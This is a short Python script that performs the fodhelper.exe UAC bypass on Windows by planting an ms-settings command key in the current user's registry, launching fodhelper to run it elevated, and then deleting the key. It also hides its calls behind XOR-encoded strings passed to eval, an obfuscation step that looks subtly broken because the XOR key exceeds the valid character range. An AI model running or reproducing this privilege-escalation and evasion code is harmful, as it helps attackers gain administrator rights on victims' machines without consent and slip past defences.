import os
import sys
import ctypes
import winreg
import time

def uac_bypass_safe():
    key_path = r"Software\Classes\ms-settings\shell\open\command"
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, "notepad.exe")
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)

        print("[*] Launching fodhelper.exe to trigger UAC bypass...")
        os.system("start fodhelper.exe")

        time.sleep(2)

        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        print("[+] Cleaned up registry. Done.")

    except Exception as e:
        print(f"[!] Failed: {e}")

def encrypt_string(s):
    key = 0x12345678
    encrypted = ""
    for c in s:
        encrypted += chr(ord(c) ^ key)
    return encrypted

def decrypt_string(s):
    key = 0x12345678
    decrypted = ""
    for c in s:
        decrypted += chr(ord(c) ^ key)
    return decrypted

if __name__ == "__main__":
    encrypted_admin_check = encrypt_string("ctypes.windll.shell32.IsUserAnAdmin()")
    encrypted_uac_bypass = encrypt_string("uac_bypass_safe()")
    encrypted_print_admin = encrypt_string("[+] Already running as admin.")
    encrypted_print_bypass = encrypt_string("[*] Attempting UAC bypass...")

    if eval(decrypt_string(encrypted_admin_check)):
        print(decrypt_string(encrypted_print_admin))
    else:
        print(decrypt_string(encrypted_print_bypass))
        eval(decrypt_string(encrypted_uac_bypass))
